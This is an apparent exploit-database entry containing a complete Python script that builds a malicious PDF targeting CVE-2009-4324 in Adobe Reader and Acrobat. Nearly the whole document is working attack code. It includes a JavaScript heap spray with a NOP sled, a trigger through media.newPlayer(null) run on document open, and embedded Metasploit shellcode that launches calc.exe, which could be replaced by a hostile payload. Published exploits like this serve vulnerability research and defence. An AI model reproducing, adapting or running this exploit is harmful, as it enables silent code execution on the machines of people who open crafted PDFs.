Adobe Reader and Acrobat (CVE-2009-4324) Exploit
================================================


# Title: Adobe Reader and Acrobat (CVE-2009-4324) Exploit
# CVE-ID: (CVE-2009-4324)
# OSVDB-ID: ()
# Author: Ahmed Obied
# Published: 2009-12-23
# Verified: yes

view source
print?
#
#   Author : Ahmed Obied 
#
#   This program generates a PDF file that exploits a vulnerability (CVE-2009-4324)
#   in Adobe Reader and Acrobat. The generated PDF file was tested using Adobe
#   Reader 9.2.0 on Windows XP SP3. The exploit&#039;s payload spawns the calculator.
#
#   Usage  : python adobe_newplayer.py [output file name]
#  
 
import sys
 
class PDF:
     
    def __init__(self):
        self.xrefs = []
        self.eol = &#039;\x0d\x0a&#039;
        self.content = &#039;&#039;
        self.xrefs_offset = 0
                
    def header(self):
        self.content += &#039;%PDF-1.1&#039; + self.eol 
     
    def obj(self, obj_num, data):
        self.xrefs.append(len(self.content))
        self.content += &#039;%d 0 obj&#039; % obj_num
        self.content += self.eol + &#039;<< &#039; + data + &#039; >>&#039; + self.eol
        self.content += &#039;endobj&#039; + self.eol
     
    def ref(self, ref_num):
        return &#039;%d 0 R&#039; % ref_num
     
    def xref(self):
        self.xrefs_offset = len(self.content)
        self.content += &#039;xref&#039; + self.eol
        self.content += &#039;0 %d&#039; % (len(self.xrefs) + 1)
        self.content += self.eol
        self.content += &#039;0000000000 65535 f&#039; + self.eol
        for i in self.xrefs:
            self.content += &#039;%010d 00000 n&#039; % i
            self.content += self.eol
      
    def trailer(self):
        self.content += &#039;trailer&#039; + self.eol
        self.content += &#039;<< /Size %d&#039; % (len(self.xrefs) + 1)
        self.content += &#039; /Root &#039; + self.ref(1) + &#039; >> &#039; + self.eol
        self.content += &#039;startxref&#039; + self.eol
        self.content += &#039;%d&#039; % self.xrefs_offset
        self.content += self.eol
        self.content += &#039;%%EOF&#039;
         
    def generate(self):  
        return self.content
 
class Exploit:
     
    def convert_to_utf16(self, payload):
        enc_payload = &#039;&#039;
        for i in range(0, len(payload), 2):
            num = 0
            for j in range(0, 2):
                num += (ord(payload[i + j]) & 0xff) << (j * 8)
            enc_payload += &#039;%%u%04x&#039; % num
        return enc_payload
             
    def get_payload(self):
        # win32_exec - EXITFUNC=process CMD=calc.exe Size=164 Encoder=PexFnstenvSub
        # http://metasploit.com
        payload  = &#039;\x31\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x6f&#039;
        payload += &#039;\x02\xb1\x0e\x83\xeb\xfc\xe2\xf4\x93\xea\xf5\x0e\x6f\x02\x3a\x4b&#039;
        payload += &#039;\x53\x89\xcd\x0b\x17\x03\x5e\x85\x20\x1a\x3a\x51\x4f\x03\x5a\x47&#039;
        payload += &#039;\xe4\x36\x3a\x0f\x81\x33\x71\x97\xc3\x86\x71\x7a\x68\xc3\x7b\x03&#039;
        payload += &#039;\x6e\xc0\x5a\xfa\x54\x56\x95\x0a\x1a\xe7\x3a\x51\x4b\x03\x5a\x68&#039;
        payload += &#039;\xe4\x0e\xfa\x85\x30\x1e\xb0\xe5\xe4\x1e\x3a\x0f\x84\x8b\xed\x2a&#039;
        payload += &#039;\x6b\xc1\x80\xce\x0b\x89\xf1\x3e\xea\xc2\xc9\x02\xe4\x42\xbd\x85&#039;
        payload += &#039;\x1f\x1e\x1c\x85\x07\x0a\x5a\x07\xe4\x82\x01\x0e\x6f\x02\x3a\x66&#039;
        payload += &#039;\x53\x5d\x80\xf8\x0f\x54\x38\xf6\xec\xc2\xca\x5e\x07\x7c\x69\xec&#039;
        payload += &#039;\x1c\x6a\x29\xf0\xe5\x0c\xe6\xf1\x88\x61\xd0\x62\x0c\x2c\xd4\x76&#039;
        payload += &#039;\x0a\x02\xb1\x0e&#039;
        return self.convert_to_utf16(payload)
     
    def get_exploit(self):
        exploit = &#039;&#039;&#039;
         
        function spray_heap()
        {
            var chunk_size, payload, nopsled;
             
            chunk_size = 0x8000;
            payload = unescape("<PAYLOAD>");
            nopsled = unescape("<NOP>");
            while (nopsled.length < chunk_size)
                nopsled += nopsled;
            nopsled_len = chunk_size - (payload.length + 20);       
            nopsled = nopsled.substring(0, nopsled_len);
            heap_chunks = new Array();
            for (var i = 0 ; i < <CHUNKS> ; i++)
                heap_chunks[i] = nopsled + payload;
        }   
          
        function trigger_bug()
        {
            util.printd("1.000000000000000000000000 : 0000000", new Date());
            try {
                media.newPlayer(null);
            } catch(e) {}
            util.printd("1.000000000000000000000000 : 0000000", new Date());
        }
         
        spray_heap();
        trigger_bug();
         
        &#039;&#039;&#039;
        exploit = exploit.replace(&#039;<PAYLOAD>&#039;, self.get_payload())
        exploit = exploit.replace(&#039;<NOP>&#039;, &#039;%u0d0d%u0d0d&#039;)
        exploit = exploit.replace(&#039;<CHUNKS>&#039;, &#039;1200&#039;)     
        return exploit  
     
def generate_pdf():
        exploit = Exploit()
        pdf = PDF()
        pdf.header()
        pdf.obj(1, &#039;/Type /Catalog /Outlines &#039; + pdf.ref(2) + &#039; /Pages &#039; + pdf.ref(3) + &#039; /OpenAction &#039; + pdf.ref(5))
        pdf.obj(2, &#039;/Type /Outlines /Count 0&#039;)
        pdf.obj(3, &#039;/Type /Pages /Kids [&#039; + pdf.ref(4) + &#039;] /Count 1&#039;)
        pdf.obj(4, &#039;/Type /Page /Parent &#039; + pdf.ref(3) + &#039; /MediaBox [0 0 612 792]&#039;)
        pdf.obj(5, &#039;/Type /Action /S /JavaScript /JS (%s)&#039; % exploit.get_exploit())   
        pdf.xref()
        pdf.trailer()
        return pdf.generate()
            
def main():
    if len(sys.argv) != 2:
        print &#039;Usage: python %s [output file name]&#039; % sys.argv[0]
        sys.exit(0)
    file_name = sys.argv[1]
    if not file_name.endswith(&#039;.pdf&#039;):
        file_name = file_name + &#039;.pdf&#039;
    try:
        fd = open(file_name, &#039;w&#039;)
        fd.write(generate_pdf())   
        fd.close()
        print &#039;[-] PDF file generated and written to %s&#039; % file_name
    except IOError:
        print &#039;[*] Error : An IO error has occurred&#039;
        print &#039;[-] Exiting ...&#039;
        sys.exit(-1)
                
if __name__ == &#039;__main__&#039;:
    main()



